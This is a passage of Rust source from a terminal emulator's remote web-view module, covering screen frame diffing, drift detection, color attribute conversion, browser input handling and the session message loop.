                if moved > 0 { 'S' } else { 'T' }
            );
            changed = true;
        }
        let mut resent = 0;
        for (idx, line) in frame.lines.iter().enumerate() {
            let before = if full {
                None
            } else {
                idx.checked_add_signed(moved)
                    .and_then(|i| self.lines.get(i))
            };
            if before.map(|old| row_body(old)) != Some(row_body(line)) {
                let old_cells = if full {
                    None
                } else {
                    idx.checked_add_signed(moved)
                        .and_then(|i| self.cells.get(i))
                };
                let delta = old_cells
                    .zip(frame.cells.get(idx))
                    .and_then(|(old, new)| row_delta(idx, old, new, frame.cols))
                    .filter(|delta| delta.len() < line.len());
                data.push_str(delta.as_deref().unwrap_or(line));
                changed = true;
                resent += 1;
            }
        }
        let images_changed = self.images != frame.images;
        let title_changed = !self.primed || self.title != frame.title;
        let wrapped_changed = !self.primed || self.wrapped != frame.wrapped;
        let layout_changed = !self.primed
            || self.cols != frame.cols
            || self.rows != frame.rows
            || self.scrolled != frame.scrolled
            || self.local_scroll != frame.local_scroll;
        if !changed
            && !wrapped_changed
            && !images_changed
            && self.cursor == frame.cursor
            && !title_changed
            && !layout_changed
        {
            return None;
        }
        self.primed = true;
        frame.title_changed = title_changed;
        frame.wrapped_changed = wrapped_changed;
        frame.layout_changed = layout_changed;
        if images_changed {
            self.images.clone_from(&frame.images);
        }
        frame.images_changed = images_changed;
        if self.recent.len() == RECENT_KEPT {
            self.recent.pop_front();
        }
        self.recent.push_back(if full {
            format!("full {resent}")
        } else if moved != 0 {
            format!("move {moved} rows {resent}")
        } else {
            format!("rows {resent}")
        });
        data.push_str(&frame.cursor);
        self.cols = frame.cols;
        self.rows = frame.rows;
        self.title.clone_from(&frame.title);
        self.scrolled = frame.scrolled;
        self.local_scroll = frame.local_scroll;
        self.cursor.clone_from(&frame.cursor);
        self.lines.clone_from(&frame.lines);
        self.cells = std::mem::take(&mut frame.cells);
        self.wrapped.clone_from(&frame.wrapped);
        Some((frame, data))
    }
}

/// A row without its leading cursor position, so a row that moved compares
/// equal to where it was.
fn row_body(line: &str) -> &str {
    line.strip_prefix("\x1b[")
        .and_then(|rest| rest.find('H').map(|i| &rest[i + 1..]))
        .unwrap_or(line)
}

/// How many rows the screen content moved: positive when it moved up (new
/// output, or scrolling toward the bottom), negative when it moved down.
/// Zero unless the move reuses more rows than leaving everything in place.
fn row_shift(old: &[String], new: &[String]) -> isize {
    let rows = new.len();
    if old.len() != rows || rows < 4 {
        return 0;
    }
    let reused = |shift: isize| {
        (0..rows)
            .filter(|&i| {
                i.checked_add_signed(shift)
                    .and_then(|j| old.get(j))
                    .is_some_and(|o| row_body(o) == row_body(&new[i]))
            })
            .count()
    };
    let in_place = reused(0);
    // A shift must save two rows. When at most one changed, none can win.
    if in_place + 2 > rows {
        return 0;
    }
    let mut best = (0, in_place);
    for k in 1..=(rows / 2) as isize {
        for shift in [k, -k] {
            let n = reused(shift);
            if n > best.1 {
                best = (shift, n);
            }
        }
    }
    // A move costs one short sequence; worth it once it saves a few rows.
    if best.1 >= in_place + 2 {
        best.0
    } else {
        0
    }
}

/// The visible text of a row, escape sequences and whitespace removed, so
/// Kaku's row and xterm.js's copy compare equal however each spaced it.
fn row_text(line: &str) -> String {
    let mut out = String::new();
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\x1b' {
            if chars.peek() == Some(&'[') {
                chars.next();
                for c in chars.by_ref() {
                    if ('\x40'..='\x7e').contains(&c) {
                        break;
                    }
                }
            }
            continue;
        }
        if !c.is_whitespace() {
            out.push(c);
        }
    }
    out
}

/// What a page that checks by digest sends for the rows Kaku believes it
/// shows: FNV-1a 32 over each row's text without whitespace, trailing empty
/// rows dropped (`drifted_rows` reads a missing row as empty), rows joined
/// by newlines, as UTF-8.
fn rows_digest(shown: &[String]) -> u32 {
    let mut texts: Vec<String> = shown.iter().map(|l| row_text(l)).collect();
    while texts.last().is_some_and(String::is_empty) {
        texts.pop();
    }
    let mut hash: u32 = 0x811c_9dc5;
    for b in texts.join("\n").bytes() {
        hash ^= u32::from(b);
        hash = hash.wrapping_mul(0x0100_0193);
    }
    hash
}

/// Rows where the page's text differs from what Kaku believes it shows.
fn drifted_rows(shown: &[String], page: &[String]) -> Vec<usize> {
    let rows = shown.len().max(page.len());
    (0..rows)
        .filter(|&i| {
            let kaku = shown.get(i).map(|l| row_text(l)).unwrap_or_default();
            let seen: String = page
                .get(i)
                .map(|l| l.chars().filter(|c| !c.is_whitespace()).collect())
                .unwrap_or_default();
            kaku != seen
        })
        .collect()
}

/// For each drifted row, the first of Kaku's rows the page shows there
/// instead ("5>23": page row 5 holds Kaku's row 23, "5>?" a row Kaku does
/// not have, "5>_" a blank). Row numbers only, never text.
fn page_sources(shown: &[String], page: &[String], drift: &[usize]) -> String {
    let text = |l: &str| -> String { l.chars().filter(|c| !c.is_whitespace()).collect() };
    let kaku: Vec<String> = shown.iter().map(|l| row_text(l)).collect();
    drift
        .iter()
        .take(8)
        .map(|&i| {
            let seen = page.get(i).map(|l| text(l)).unwrap_or_default();
            let from = if seen.is_empty() {
                "_".to_string()
            } else {
                kaku.iter()
                    .position(|k| *k == seen)
                    .map_or("?".to_string(), |j| j.to_string())
            };
            format!("{i}>{from}")
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// Page rows that repeat the non-blank row above them: a screen filled with
/// one line scores near its height.
fn repeated_rows(page: &[String]) -> usize {
    let text = |l: &str| -> String { l.chars().filter(|c| !c.is_whitespace()).collect() };
    page.windows(2)
        .filter(|w| {
            let a = text(&w[0]);
            !a.is_empty() && a == text(&w[1])
        })
        .count()
}

/// When the drifted rows all show Kaku's rows from `k` rows away, the page
/// is shifted by `k` (positive: it shows rows from further down); the drift
/// report names that so its cause can be told from a garbled screen.
fn page_offset(shown: &[String], page: &[String], drift: &[usize]) -> Option<isize> {
    let text = |l: &str| -> String { l.chars().filter(|c| !c.is_whitespace()).collect() };
    let candidates = drift
        .iter()
        .filter(|&&i| page.get(i).is_some_and(|l| !text(l).is_empty()));
    let candidates: Vec<usize> = candidates.copied().collect();
    if candidates.is_empty() {
        return None;
    }
    (-4isize..=4).filter(|&k| k != 0).find(|&k| {
        candidates.iter().all(|&i| {
            i.checked_add_signed(k)
                .and_then(|j| shown.get(j))
                .is_some_and(|kaku| row_text(kaku) == text(&page[i]))
        })
    })
}

fn cursor_shape_param(shape: CursorShape) -> u8 {
    match shape {
        // The app did not pick a shape, so Kaku draws its configured default.
        CursorShape::Default => match config::configuration().default_cursor_style {
            config::DefaultCursorStyle::BlinkingBlock => 1,
            config::DefaultCursorStyle::SteadyBlock => 2,
            config::DefaultCursorStyle::BlinkingUnderline => 3,
            config::DefaultCursorStyle::SteadyUnderline => 4,
            config::DefaultCursorStyle::BlinkingBar => 5,
            config::DefaultCursorStyle::SteadyBar => 6,
        },
        CursorShape::BlinkingBlock => 1,
        CursorShape::SteadyBlock => 2,
        CursorShape::BlinkingUnderline => 3,
        CursorShape::SteadyUnderline => 4,
        CursorShape::BlinkingBar => 5,
        CursorShape::SteadyBar => 6,
    }
}

/// The subset of cell attributes that xterm.js can draw.
#[derive(Clone, PartialEq, Debug)]
struct Sgr {
    fg: ColorAttribute,
    bg: ColorAttribute,
    intensity: Intensity,
    underline: Underline,
    blink: Blink,
    italic: bool,
    reverse: bool,
    strikethrough: bool,
    invisible: bool,
}

/// What the Mac window does to dim (half intensity) text: its color times
/// 0.75 in linear light (`HALF_INTENSITY_DIM_FACTOR` in kaku-gui).
const HALF_INTENSITY_DIM_FACTOR: f32 = 0.75;

impl Sgr {
    fn from_attrs(attrs: &CellAttributes, palette: &ColorPalette) -> Self {
        // xterm.js draws dim text at half opacity over the background, after
        // swapping for reverse video; the Mac window darkens the foreground a
        // quarter, before the swap. Claude Code's selected chips (reverse and
        // dim) came out grey on light blue, unreadable, where the app shows
        // dark text on blue. Send the Mac's color instead of the flag.
        let (fg, intensity) = match attrs.intensity() {
            Intensity::Half => {
                let (r, g, b, a) = palette.resolve_fg(attrs.foreground()).to_linear().tuple();
                let f = HALF_INTENSITY_DIM_FACTOR;
                let dimmed = LinearRgba(r * f, g * f, b * f, a).to_srgb();
                (
                    ColorAttribute::TrueColorWithDefaultFallback(dimmed),
                    Intensity::Normal,
                )
            }
            other => (overridden_fg(attrs.foreground(), palette), other),
        };
        Self {
            fg,
            bg: overridden_bg(attrs.background(), palette),
            intensity,
            underline: attrs.underline(),
            blink: attrs.blink(),
            italic: attrs.italic(),
            reverse: attrs.reverse(),
            strikethrough: attrs.strikethrough(),
            invisible: attrs.invisible(),
        }
    }

    fn write(&self, out: &mut String) {
        out.push_str("\x1b[0");
        match self.intensity {
            Intensity::Normal => {}
            Intensity::Bold => out.push_str(";1"),
            Intensity::Half => out.push_str(";2"),
        }
        if self.italic {
            out.push_str(";3");
        }
        match self.underline {
            Underline::None => {}
            Underline::Double => out.push_str(";21"),
            _ => out.push_str(";4"),
        }
        if self.blink != Blink::None {
            out.push_str(";5");
        }
        if self.reverse {
            out.push_str(";7");
        }
        if self.invisible {
            out.push_str(";8");
        }
        if self.strikethrough {
            out.push_str(";9");
        }
        write_color(out, self.fg, 38);
        write_color(out, self.bg, 48);
        out.push('m');
    }
}

/// The page only has the scheme's sixteen colors, not its `color_overrides`,
/// so a background the Mac window replaces goes out as the replacement. Kaku
/// Dark's ANSI black is light grey for text and maps back to the window
/// background behind it; sent as index 0, Claude Code's scrolled transcript
/// (ANSI black behind every row) came out light grey with white text.
fn overridden_bg(bg: ColorAttribute, palette: &ColorPalette) -> ColorAttribute {
    let raw = match bg {
        ColorAttribute::Default => return bg,
        ColorAttribute::PaletteIndex(idx) => palette.colors.0[idx as usize],
        ColorAttribute::TrueColorWithPaletteFallback(c, _)
        | ColorAttribute::TrueColorWithDefaultFallback(c) => c,
    };
    let resolved = palette.resolve_bg(bg);
    if resolved == raw {
        bg
    } else {
        ColorAttribute::TrueColorWithDefaultFallback(resolved)
    }
}

/// The same for `foreground_color_overrides`, which the Mac applies to the
/// default and true color foregrounds (black text from Rich and Hermes).
fn overridden_fg(fg: ColorAttribute, palette: &ColorPalette) -> ColorAttribute {
    let raw = match fg {
        ColorAttribute::Default => palette.foreground,
        ColorAttribute::PaletteIndex(_) => return fg,
        ColorAttribute::TrueColorWithPaletteFallback(c, _)
        | ColorAttribute::TrueColorWithDefaultFallback(c) => c,
    };
    let resolved = palette.resolve_fg(fg);
    if resolved == raw {
        fg
    } else {
        ColorAttribute::TrueColorWithDefaultFallback(resolved)
    }
}

fn write_color(out: &mut String, color: ColorAttribute, base: u8) {
    match color {
        ColorAttribute::Default => {}
        ColorAttribute::PaletteIndex(idx) => {
            let _ = write!(out, ";{base};5;{idx}");
        }
        ColorAttribute::TrueColorWithPaletteFallback(c, _)
        | ColorAttribute::TrueColorWithDefaultFallback(c) => {
            let (r, g, b, _) = c.to_srgb_u8();
            let _ = write!(out, ";{base};2;{r};{g};{b}");
        }
    }
}

// ── Input ─────────────────────────────────────────────────────────────────────

fn key_code(name: &str) -> Option<KeyCode> {
    Some(match name {
        "Enter" => KeyCode::Enter,
        "Tab" => KeyCode::Tab,
        "Escape" => KeyCode::Escape,
        "Backspace" => KeyCode::Backspace,
        "Delete" => KeyCode::Delete,
        "Insert" => KeyCode::Insert,
        "Home" => KeyCode::Home,
        "End" => KeyCode::End,
        "PageUp" => KeyCode::PageUp,
        "PageDown" => KeyCode::PageDown,
        "ArrowLeft" => KeyCode::LeftArrow,
        "ArrowRight" => KeyCode::RightArrow,
        "ArrowUp" => KeyCode::UpArrow,
        "ArrowDown" => KeyCode::DownArrow,
        _ => {
            if let Some(n) = name.strip_prefix('F').and_then(|n| n.parse::<u8>().ok()) {
                if (1..=24).contains(&n) {
                    return Some(KeyCode::Function(n));
                }
                return None;
            }
            let mut chars = name.chars();
            match (chars.next(), chars.next()) {
                (Some(c), None) => KeyCode::Char(c),
                _ => return None,
            }
        }
    })
}

/// A pane in tab `tab_id`, which is how tab actions name their tab.
fn tab_target(tab_id: usize) -> Option<usize> {
    Mux::try_get()
        .and_then(|mux| mux.get_tab(mux::tab::TabId::from(tab_id)))
        .and_then(|tab| tab.get_active_pane())
        .map(|pane| pane.pane_id().into())
}

fn handle_input(pane: &Arc<dyn Pane>, msg: WebClientMsg, view: &mut View) {
    let interactive = matches!(
        msg,
        WebClientMsg::Text { .. }
            | WebClientMsg::Key { .. }
            | WebClientMsg::Paste { .. }
            | WebClientMsg::Click { .. }
    );
    // The Mac shows Kaku Assistant's chat over this pane: typing here would
    // reach the shell hidden under it. The page says so and holds off.
    if interactive && ai_chat_open(pane.pane_id().into()) {
        return;
    }
    if interactive {
        if let Some((cols, rows)) = view.claimed {
            claim_tab_size(pane.pane_id().into(), cols, rows);
        }
        mark_seen(pane.pane_id().into(), view);
    }
    let result = match msg {
        WebClientMsg::Text { data } => {
            view.pinned_top = None;
            view.found_at = None;
            pane.send_text(&data)
        }
        WebClientMsg::Paste { data } => {
            view.pinned_top = None;
            pane.send_paste(&data)
        }
        WebClientMsg::Key {
            key,
            ctrl,
            alt,
            shift,
        } => {
            view.pinned_top = None;
            let Some(code) = key_code(&key) else {
                return;
            };
            let mut mods = Modifiers::NONE;
            if ctrl {
                mods |= Modifiers::CTRL;
            }
            if alt {
                mods |= Modifiers::ALT;
            }
            if shift {
                mods |= Modifiers::SHIFT;
            }
            pane.key_down(code, mods)
        }
        // Same routing as Kaku's own wheel: an app that asked for the mouse
        // (Claude Code, vim with mouse on) gets wheel events and scrolls
        // itself; a full-screen app without the mouse gets arrow keys; a
        // plain shell scrolls Kaku's history.
        WebClientMsg::Scroll { lines } if pane.is_mouse_grabbed() => {
            let dims = pane.get_dimensions();
            let button = if lines > 0 {
                MouseButton::WheelUp(1)
            } else {
                MouseButton::WheelDown(1)
            };
            let mut result = Ok(());
            for _ in 0..lines.unsigned_abs().min(MAX_WHEEL_STEPS) {
                result = pane.mouse_event(MouseEvent {
                    kind: MouseEventKind::Press,
                    x: dims.cols / 2,
                    y: (dims.viewport_rows / 2) as i64,
                    x_pixel_offset: 0,
                    y_pixel_offset: 0,
                    button,
                    modifiers: Modifiers::NONE,
                });
                if result.is_err() {
                    break;
                }
            }
            result
        }
        WebClientMsg::Click { x, y } => {
            if !pane.is_mouse_grabbed() {
                return;
            }
            let dims = pane.get_dimensions();
            let (x, y) = (
                x.min(dims.cols.saturating_sub(1)),
                y.min(dims.viewport_rows.saturating_sub(1)) as i64,
            );
            let event = move |kind, button| MouseEvent {
                kind,
                x,
                y,
                x_pixel_offset: 0,
                y_pixel_offset: 0,
                button,
                modifiers: Modifiers::NONE,
            };
            // As a hand does in the Mac window: the pointer arrives, presses,
            // and lets go a moment later. Press and release in one instant,
            // with no move first, left Claude Code's expandable blocks in a
            // half-made selection instead of expanding them.
            pane.mouse_event(event(MouseEventKind::Move, MouseButton::None))
                .and_then(|()| pane.mouse_event(event(MouseEventKind::Press, MouseButton::Left)))
                .map(|()| {
                    let pane = Arc::clone(pane);
                    tokio::spawn(async move {
                        tokio::time::sleep(CLICK_HOLD).await;
                        let _ = pane.mouse_event(event(MouseEventKind::Release, MouseButton::Left));
                    });
                })
        }
        WebClientMsg::Scroll { lines } if !pane_scrolls_locally(pane) => {
            let key = if lines > 0 {
                KeyCode::UpArrow
            } else {
                KeyCode::DownArrow
            };
            let mut result = Ok(());
            for _ in 0..lines.unsigned_abs().min(MAX_WHEEL_STEPS) {
                result = pane.key_down(key, Modifiers::NONE);
                if result.is_err() {
                    break;
                }
            }
            result
        }
        WebClientMsg::Scroll { lines } => {
            let dims = pane.get_dimensions();
            let current = view.pinned_top.unwrap_or(dims.physical_top);
            let top = (current - lines).clamp(dims.scrollback_top, dims.physical_top);
            view.pinned_top = (top < dims.physical_top).then_some(top);
            Ok(())
        }
        WebClientMsg::NewTab => {
            dispatch_tab_action(TabAction::New {
                pane_id: pane.pane_id().into(),
            });
            Ok(())
        }
        WebClientMsg::SplitPane { pane_id, direction } => {
            use config::keyassignment::PaneDirection;
            if lookup_pane(pane_id).is_some()
                && matches!(
                    direction,
                    PaneDirection::Left
                        | PaneDirection::Right
                        | PaneDirection::Up
                        | PaneDirection::Down
                )
            {
                dispatch_tab_action(TabAction::Split { pane_id, direction });
            }
            Ok(())
        }
        WebClientMsg::ClosePane { pane_id } => {
            if lookup_pane(pane_id).is_some() {
                dispatch_tab_action(TabAction::ClosePane { pane_id });
            }
            Ok(())
        }
        WebClientMsg::ZoomPane { pane_id } => {
            if lookup_pane(pane_id).is_some() {
                let claimed = if PaneId::from(pane_id) == pane.pane_id() {
                    view.claimed
                } else {
                    None
                };
                dispatch_tab_action(TabAction::Zoom { pane_id, claimed });
            }
            Ok(())
        }
        WebClientMsg::CloseTab { tab_id } => {
            if let Some(target) = tab_target(tab_id) {
                dispatch_tab_action(TabAction::Close { pane_id: target });
            }
            Ok(())
        }
        WebClientMsg::RenameTab { tab_id, title } => {
            if let Some(target) = tab_target(tab_id) {
                let title: String = title.chars().take(200).collect();
                dispatch_tab_action(TabAction::Rename {
                    pane_id: target,
                    title,
                });
            }
            Ok(())
        }
        WebClientMsg::MoveTab { tab_id, index } => {
            if let Some(target) = tab_target(tab_id) {
                dispatch_tab_action(TabAction::Move {
                    pane_id: target,
                    index,
                });
            }
            Ok(())
        }
        WebClientMsg::Hello { .. }
        | WebClientMsg::Visibility { .. }
        | WebClientMsg::Redraw
        | WebClientMsg::History { .. }
        | WebClientMsg::Ping
        | WebClientMsg::FrameAck { .. }
        | WebClientMsg::Attach { .. }
        | WebClientMsg::Verify { .. }
        | WebClientMsg::Search { .. }
        | WebClientMsg::UploadStart { .. }
        | WebClientMsg::UploadChunk { .. }
        | WebClientMsg::UploadCancel { .. }
        | WebClientMsg::UploadEnd { .. }
        | WebClientMsg::Download { .. }
        | WebClientMsg::DownloadAck { .. }
        | WebClientMsg::DownloadCancel { .. }
        | WebClientMsg::PathsExist { .. } => Ok(()),
        WebClientMsg::Resize { cols, rows } => {
            let cols = cols.clamp(MIN_COLS, MAX_COLS);
            let rows = rows.clamp(MIN_ROWS, MAX_ROWS);
            view.claimed = Some((cols, rows));
            claim_tab_size(pane.pane_id().into(), cols, rows);
            Ok(())
        }
    };
    if let Err(e) = result {
        log::debug!("kaku-remote web: input failed: {e:#}");
    }
}

// ── Session ───────────────────────────────────────────────────────────────────

/// Application-level backpressure, released only after xterm parsed a frame.
#[derive(Default)]
struct FrameWindow {
    sent: u64,
    acked: u64,
    enabled: bool,
    pending: VecDeque<(u64, usize)>,
}

impl FrameWindow {
    fn hello(&mut self, enabled: bool) {
        self.enabled = enabled;
        self.acked = self.sent;
        self.pending.clear();
    }

    fn ready(&self) -> bool {
        !self.enabled
            || (self.pending.len() < FRAME_WINDOW
                && self.pending.iter().map(|(_, bytes)| bytes).sum::<usize>()
                    < FRAME_BYTES_WATERMARK)
    }

    fn record(&mut self, bytes: usize) {
        self.sent += 1;
        if self.enabled {
            self.pending.push_back((self.sent, bytes));
        }
    }

    fn acknowledge(&mut self, seq: u64) {
        if seq > self.sent {
            return;
        }
        self.acked = self.acked.max(seq);
        while self
            .pending
            .front()
            .is_some_and(|(seq, _)| *seq <= self.acked)
        {
            self.pending.pop_front();
        }
    }
}

fn lookup_pane(pane_id: usize) -> Option<Arc<dyn Pane>> {
    Mux::try_get()?.get_pane(PaneId::from(pane_id))
}

fn subscribe(dirty: &WebDirty, pane_id: usize) -> broadcast::Receiver<()> {
    dirty
        .lock()
        .entry(pane_id)
        .or_insert_with(|| broadcast::channel(16).0)
        .subscribe()
}

fn encode(msg: &WebServerMsg) -> Option<String> {
    serde_json::to_string(msg).ok()
}

/// Collect on the GUI thread, but return through a mailbox so input keeps
/// flowing while AppKit is busy. Each session has at most one request in flight.
fn request_tabs(reply: mpsc::Sender<Vec<TabInfo>>) {
    promise::spawn::spawn_into_main_thread(async move {
        let _ = reply.try_send(collect_tabs());
    })
    .detach();
}

/// One browser, whatever carries its messages: the local WebSocket or the
/// relay tunnel. `inbox` yields the page's JSON messages and `outbox` takes
/// ours; `frames` takes the desktop view's pictures as binary messages. The
/// session ends when either side goes away.
pub(crate) async fn run_session(
    mut inbox: mpsc::Receiver<String>,
    outbox: crate::queue::Sender<String>,
    frames: mpsc::Sender<Vec<u8>>,
    dirty: WebDirty,
) {
    let _awake = crate::awake::Awake::hold();
    let (direct_inbox, outbox, frames) = crate::p2p::wrap(inbox, outbox, frames);
    #[cfg(feature = "desktop")]
    {
        inbox = crate::desktop::tap(direct_inbox, outbox.clone(), frames);
    }
    #[cfg(not(feature = "desktop"))]
    {
        inbox = direct_inbox;
        drop(frames);
    }
    if let Some(json) = encode(&WebServerMsg::Config(&crate::config_info())) {
        if outbox.send(json).await.is_err() {
            return;
        }
    }

    let mut attached: Option<usize> = None;
    let mut updates: Option<broadcast::Receiver<()>> = None;
    let mut view = View::default();
    let mut shown = Shown::default();
    // The page keeps unchanged frame fields (`Hello::delta`).
    let mut page_delta = false;
    // The page is in the background (`WebClientMsg::Visibility`).
    let mut page_hidden = false;
    // How the page last said it draws, logged when that changes.
    let mut page_drawing = String::new();
    // A page reporting drift every few seconds would otherwise fill the
    // log; the redraw happens every time, the report at most this often.
    let mut drift_logged: Option<std::time::Instant> = None;
    let mut last_tabs: Option<Vec<TabInfo>> = None;
    let (tabs_ready, mut tabs_results) = mpsc::channel(1);
    let mut tabs_pending = false;
    let mut dirty_frame = false;
    // Frames sent this session; a page's verify only counts once it has
    // applied the same number, so frames in flight never read as drift.
    let mut frame_window = FrameWindow::default();
    let mut last_frame_at = std::time::Instant::now();
    let mut clipboard = CLIPBOARD.subscribe();
    let mut notifications = NOTIFICATIONS.subscribe();
    // Image files this browser already has.
    let mut sent_images: HashSet<String> = HashSet::new();
    let mut uploads = Uploads::default();
    let mut downloads = Downloads::default();
    // Hover previews being scaled off the session's task, by download id;
    // one cancelled meanwhile is dropped when it is ready.
    let (previews_ready, mut previews_done) = mpsc::channel::<(u32, Result<Vec<u8>, String>)>(4);
    let mut previewing: HashSet<u32> = HashSet::new();
    let mut next_render = tokio::time::Instant::now();
    let mut idle = tokio::time::interval(IDLE_REFRESH);
    let mut last_heard = std::time::Instant::now();
    let mut tab_changes = TABS_CHANGED.subscribe();
    let mut tabs_due: Option<tokio::time::Instant> = None;
    // A tab this browser asked for: the tabs it saw before, until it shows.
    let mut follow_new: Option<(HashSet<usize>, std::time::Instant)> = None;

    loop {
        let pane_update = async {
            match updates.as_mut() {
                Some(rx) => rx.recv().await,
                None => std::future::pending().await,
            }
        };
        tokio::select! {
            msg = inbox.recv() => {
                let Some(text) = msg else { break };
                last_heard = std::time::Instant::now();
                let msg = match serde_json::from_str::<WebClientMsg>(&text) {
                    Ok(msg) => msg,
                    Err(e) => {
                        log::debug!("kaku-remote web: bad message: {e}");
                        continue;
                    }
                };
                if matches!(&msg, WebClientMsg::Text { data } | WebClientMsg::Paste { data } if data.len() > MAX_INPUT_LEN) {
                    if let Some(json) = encode(&WebServerMsg::Error { detail: "Text is larger than 64 KB. Send it as a file instead." }) {
                        if outbox.send(json).await.is_err() { break; }
                    }
                    continue;
                }
                if let WebClientMsg::Hello { frame_ack, delta } = msg {
                    frame_window.hello(frame_ack);
                    page_delta = delta;
                    continue;
                }
                if let WebClientMsg::Visibility { hidden } = msg {
                    if page_hidden && !hidden {
                        next_render = tokio::time::Instant::now();
                        dirty_frame = true;
                    }
                    page_hidden = hidden;
                    continue;
                }
                if let WebClientMsg::FrameAck { seq } = msg {
                    frame_window.acknowledge(seq);
                    continue;
                }
                if matches!(msg, WebClientMsg::Ping) {
                    let Some(json) = encode(&WebServerMsg::Pong) else { continue };
                    if outbox.send(json).await.is_err() {
                        break;
                    }
                    continue;
                }
                let cwd = |pane_id: Option<usize>| {
                    let pane = pane_id.or(attached).and_then(lookup_pane)?;
                    pane.get_current_working_dir(mux::pane::CachePolicy::AllowStale)?
                        .to_file_path()
                        .ok()
                };
                if let WebClientMsg::Download { id, path, pane_id, preview: Some(side) } = &msg {
                    if previewing.len() >= MAX_PREVIEWS {
                        let Some(json) = encode(&WebServerMsg::FileError {
                            id: *id,
                            detail: "Too many previews at once",
                        }) else { continue };
                        if outbox.send_bulk(json).await.is_err() {
                            break;
                        }
                        continue;
                    }
                    let resolved = download_path(path, cwd(*pane_id))
                        .ok_or_else(|| format!("{path}: no working directory to find it from"));
                    let (id, side, ready) = (*id, *side, previews_ready.clone());
                    previewing.insert(id);
                    tokio::task::spawn_blocking(move || {
                        let made = resolved.and_then(|path| preview_bytes(&path, side));
                        let _ = ready.blocking_send((id, made));
                    });
                    continue;
                }
                if let WebClientMsg::PathsExist { id, paths, pane_id } = msg {
                    let resolved: Vec<_> = paths
                        .iter()
                        .take(MAX_PATH_CHECKS)
                        .map(|path| (path.len() <= MAX_CHECKED_PATH).then(|| download_path(path, cwd(pane_id))).flatten())
                        .collect();
                    // A stat can hang on a network volume; keep it off the session.
                    let exists = tokio::task::spawn_blocking(move || {
                        resolved.into_iter().map(|path| path.is_some_and(|path| path.exists())).collect::<Vec<_>>()
                    })
                    .await
                    .unwrap_or_default();
                    let Some(json) = encode(&WebServerMsg::PathsExist { id, exists }) else { continue };
                    if outbox.send(json).await.is_err() {
                        break;
                    }
                    continue;
                }
                if let WebClientMsg::DownloadCancel { id } = &msg {
                    previewing.remove(id);
                }
                if let Some(replies) = handle_download(&msg, &mut downloads.0, cwd) {
                    for json in replies {
                        if outbox.send_bulk(json).await.is_err() {
                            break;
                        }
                    }
                    continue;
                }
                if let Some(reply) = handle_upload(&msg, &mut uploads.0, attached) {
                    let Some(json) = encode(&reply.as_msg()) else { continue };
                    if outbox.send(json).await.is_err() {
                        break;
                    }
                    continue;
                }
                if matches!(
                    msg,
                    WebClientMsg::UploadStart { .. }
                        | WebClientMsg::UploadChunk { .. }
                        | WebClientMsg::UploadCancel { .. }
                        | WebClientMsg::UploadEnd { .. }
                ) {
                    continue;
                }
                if let WebClientMsg::Search { query, older, restart } = &msg {
                    let Some(pane) = attached.and_then(lookup_pane) else { continue };
                    if *restart {
                        view.found_at = None;
                    }
                    let hit = search_pane(&pane, query, view.found_at, *older);
                    let reply = match hit {
                        Some((row, col, len)) => {
                            view.found_at = Some((row, col));
                            let dims = pane.get_dimensions();
                            let rows = dims.viewport_rows as isize;
                            let top = (row - rows / 3).clamp(dims.scrollback_top, dims.physical_top);
                            view.pinned_top = (top < dims.physical_top).then_some(top);
                            dirty_frame = true;
                            let shown_top = view.pinned_top.unwrap_or(dims.physical_top);
                            WebServerMsg::Found { found: true, row: (row - shown_top) as usize, col, len }
                        }
                        None => WebServerMsg::Found { found: false, row: 0, col: 0, len: 0 },
                    };
                    let Some(json) = encode(&reply) else { continue };
                    if outbox.send(json).await.is_err() {
                        break;
                    }
                    continue;
                }
                if matches!(msg, WebClientMsg::Redraw) {
                    shown = Shown::default();
                    dirty_frame = attached.is_some();
                    continue;
                }
                if let WebClientMsg::History { end, request } = msg {
                    let Some(pane_id) = attached else { continue };
                    let Some(pane) = lookup_pane(pane_id) else { continue };
                    let (first, top, rows, wrapped) = history_rows(&pane, end);
                    let reply = WebServerMsg::History { pane_id, request, first, top, rows: &rows, wrapped: &wrapped };
                    let Some(json) = encode(&reply) else { continue };
                    if outbox.send(json).await.is_err() {
                        break;
                    }
                    continue;
                }
                if let WebClientMsg::Verify { frames, rows, digest, seq, view } = &msg {
                    let drawing = view.as_ref().map(PageView::drawing).unwrap_or_default();
                    if !drawing.is_empty() && drawing != page_drawing {
                        log::info!("kaku-remote web: page draws with {drawing}");
                        page_drawing = drawing;
                    }
                    let expected = match seq {
                        Some(seq) => shown.rows_after(*seq),
                        None => (*frames == frame_window.sent).then_some(shown.lines.as_slice()),
                    };
                    if let (Some(expected), true) = (expected, attached.is_some()) {
                        let report = drift_logged.is_none_or(|at| at.elapsed() >= DRIFT_LOG_EVERY);
                        if let Some(digest) = digest {
                            if *digest == rows_digest(expected) {
                                continue;
                            }
                            // Ask for the rows for the report, which redraws
                            // when it finds the drift; between reports,
                            // redraw now.
                            if report {
                                let Some(json) = encode(&WebServerMsg::VerifyRows) else { continue };
                                if outbox.send(json).await.is_err() {
                                    break;
                                }
                            } else {
                                shown = Shown::default();
                                dirty_frame = true;
                            }
                            continue;
                        }
                        let drift = drifted_rows(expected, rows);
                        if !drift.is_empty() && report {
                            drift_logged = Some(std::time::Instant::now());
                            let pane = attached.and_then(lookup_pane);
                            let view = view.as_ref();
                            log::warn!(
                                "kaku-remote web: screen drift in {} of {} rows (last move {}, {} frames since full, scrolled {}, alt screen {}, mouse grabbed {}); rows {:?}, page offset {:?}, page shows {}, page repeats {} rows, recent frames [{}], page grid {}x{} base {} top {} alt {}, {}; page trace [{}]; redrawing",
                                drift.len(),
                                shown.lines.len(),
                                shown.last_move,
                                shown.since_full,
                                shown.scrolled,
                                pane.as_ref().is_some_and(|p| p.is_alt_screen_active()),
                                pane.as_ref().is_some_and(|p| p.is_mouse_grabbed()),
                                &drift[..drift.len().min(8)],
                                page_offset(expected, rows, &drift),
                                page_sources(expected, rows, &drift),
                                repeated_rows(rows),
                                shown.recent.iter().cloned().collect::<Vec<_>>().join(", "),
                                view.map_or(0, |v| v.cols),
                                view.map_or(0, |v| v.rows),
                                view.map_or(0, |v| v.base),
                                view.map_or(0, |v| v.top),
                                view.is_some_and(|v| v.alt),
                                view.map(PageView::drawing).unwrap_or_default(),
                                // One line per report, whatever the page sent.
                                view.map_or("", PageView::trace).escape_debug(),
                            );
                        }
                        if !drift.is_empty() {
                            shown = Shown::default();
                            dirty_frame = true;
                        }
                    }
                    continue;
                }
                if let WebClientMsg::Attach { pane_id, focus } = msg {
                    // A later explicit choice wins over an outstanding NewTab snapshot.
